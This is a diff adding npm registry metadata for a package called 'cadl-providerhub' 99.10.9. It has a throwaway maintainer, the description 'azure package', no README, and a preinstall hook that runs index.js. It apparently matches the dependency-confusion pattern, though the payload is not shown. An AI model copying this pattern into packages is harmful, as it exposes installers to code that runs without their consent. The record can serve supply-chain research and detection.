@@ -1,0 +1,62 @@
+{
+    "_id": "cadl-providerhub",
+    "name": "cadl-providerhub",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "cadl-providerhub",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "cadl-providerhub@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-VvMrHjtOGD2CyhYQCZuh39ZCclYZDlPyGBt7fCE7cshg/fklzarcmlS3cHTIcFlyMNctccxBP73xJ6y19B0QAQ==",
+                "shasum": "660f41239e55d9ef6735988d33740ae21488260f",
+                "tarball": "https://registry.npmjs.org/cadl-providerhub/-/cadl-providerhub-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5068,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiN3aFACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmq1ng//SVcxKZm+PIkzLAD83K/YV9F95eYldKfiukEw/rKIUcTRgD4e\r\nbCvLvmYqaqPJTZsol7adfHA3EbBHAtDAuVcEkCJyrbI1jSXhh/4j4I6EqdEh\r\n9DBYF+uBdkCZLbqixe4tRDMsK2XwYRFg6s3NxTNsbpNb2pm/gtUgU0Y2Gn0W\r\n24hiopEXdCwHATzQd+U1/x1Sivq57siofvb4Lzr1aMgL/w7YtfynzrCEQEgn\r\nB4Z2xHdZ5HKwpAQKh3ttBxLrZWL/dUOVKp5R2D6T2LJkaePHHDUGd+HOVMqV\r\nadJOCPsmd88RpXqsLNQnjvXwd01mstCudHuCYMLgD7pt3SFFmY92usDKxsuH\r\nV6gYPhSTvRsvjgYvxO6g+A690m/2bb9rQYytVyQQEdGSpBH4M+NEqpEZa0iN\r\njl/2RXDGJNqV2tdvcvQc7oukSyroP36RXvmaTqyY04gBXFuYqQN8iVIr8umA\r\nxeHPRE4+qklTlN2EYB9XqN/HgkBcr4xQWa0Om4oCgi/ipJ49R3MO5UIPEzfV\r\nHPBZ+ozQqPvs5homEnDmopcAMrPjgXINuJtoxzTdMWhml/lkV6uSKYjko4n3\r\nAHD9GdSts9LjGEmure+9UDKZga2Tp3Img5fWzHDRJq8VgmQh7par6iAPDqUA\r\nSjUk2JM5K42g8XRuj7eAL1p5K1oWV2OnGu0=\r\n=jitj\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "8pjugr9f",
+                "email": "8pjugr9f@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "8pjugr9f",
+                    "email": "8pjugr9f@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/cadl-providerhub_99.10.9_1647801989300_0.9695529519248569"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T18:46:29.300Z",
+        "99.10.9": "2022-03-20T18:46:29.439Z",
+        "modified": "2022-03-20T18:46:29.526Z"
+    },
+    "maintainers": [
+        {
+            "name": "8pjugr9f",
+            "email": "8pjugr9f@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
